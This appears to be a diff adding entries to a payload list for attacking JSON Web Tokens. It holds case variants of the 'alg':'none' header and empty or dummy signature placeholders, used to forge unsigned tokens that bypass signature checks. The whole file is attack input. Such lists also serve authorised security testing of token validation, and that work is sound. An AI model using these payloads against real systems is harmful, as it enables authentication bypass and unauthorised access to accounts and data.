+{"alg":"none"}
+{"alg":"None"}
+{"alg":"NONE"}
+{"alg":"nOnE"}
+{"alg":"noNe"}
+{"alg":"nONE"}
+
+# 添加签名占位
+header.payload.
+header.payload.AA==
+header.payload.e30=
